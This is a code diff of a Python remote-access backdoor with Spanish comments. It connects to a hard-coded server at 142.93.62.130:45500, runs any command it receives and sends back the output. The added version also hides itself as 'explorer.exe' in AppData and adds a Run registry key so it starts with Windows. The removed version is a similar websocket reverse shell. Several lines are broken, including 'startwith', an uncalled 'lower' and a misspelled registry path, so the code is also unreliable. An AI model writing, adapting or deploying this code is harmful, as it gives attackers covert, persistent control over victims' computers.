@@ -1,43 +1,69 @@
-from logger import console
-import asyncio
-import websockets
+import socket
+import json
 import subprocess
 import os
-import time
 import sys
-import json
+import shutil
+from _winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, CloseKey
 
-def get_sysinfo():
-    sysinfo = {'system': sys.platform, 'path': os.getcwd()}
-    return json.dumps(sysinfo)
+#configuracion del servidor (vps)
+IP_SERVER = '142.93.62.130'
+PORT = 45500
 
-def run_cmd(cmd):
-    output = subprocess.run(cmd, shell=True, capture_output=True)
-    return json.dumps({'stdout': output.stdout.decode(), 'stderr': output.stderr.decode()})
+def persistence():
+    """Hacer que se ejecute al iniciar windows"""
+    try:
+        # ruta donde se copiara el archivo
+        ruta_appdata = os.environ['APPDATA']
+        ruta_destino = os.path.join(ruta_appdata, 'explorer.exe')
 
-async def shell(websocket):
-    while True:
-        cmd = await websocket.recv()
-        if cmd == 'exit':
-            break
-        output = run_cmd(cmd)
-        await websocket.send(output)
+        # copiar el script actual (o el .exe) hacia AppData
+        if not os.path.exists(ruta_destino):
+            shutil.copyfile(sys.executable, ruta_destino)
+        
+        # Añadir el registro de inicio
+        clave = OpenKey(HKEY_CURRENT_USER,
+                        'Sofware\\Microsoft\\Windows\\CurrentVersion\\Run',
+                        0, 0x20019) # KEY_ALL_ACCESS
+        SetValueEx(clave, 'WindowsExplorer', 0, REG_SZ, ruta_destino)
+        CloseKey(clave)
+    except Exception as e:
+        pass
 
-async def conection():
-    uri = 'ws://142.93.62.130:45500'
-    async with websockets.connect(uri) as websocket:
-        await websocket.send(get_sysinfo())
-        await shell(websocket)
+def send_result(command):
+    """ Envia datos al servidor de forma segura """
+    resultado = ''
+    try:
+        if command.startwith('cd '):
+            ruta = command.strip('cd ')
+            os.chdir(ruta)
+            resultado = f'[+] Directorio actual: {os.getcwd()}'
+        else:
+            resultado = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+            resultado = resultado.decode('cp850', errors='replace')
+    except Exception as e:
+        resultado = f'[-] Error: {str(e)}'
+    return resultado
 
-def start_conection():
+def connect():
+    """ Conexion al servidor VPS """
     while True:
         try:
-            asyncio.run(conection())
-        except ConnectionRefusedError:
-            console.warn('Conexión rechazada, intentando de nuevo 5s')
-            time.sleep(5)
+            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            cliente.connect((IP_SERVER, PORT))
+            persistence()
+            cliente.send(b'[+] Bakdoor activo\n')
 
-
-
+            while True:
+                comando = cliente.recv(1024).decode().strip()
+                if comando.lower == 'salir':
+                    break
+                resultado = send_result(comando)
+                cliente.send(json.dumps(resultado).encode())
+            cliente.close()
+            break
+        except:
+            pass # reintentar conexion
+    
 if __name__ == '__main__':
-    start_conection()
+    connect()
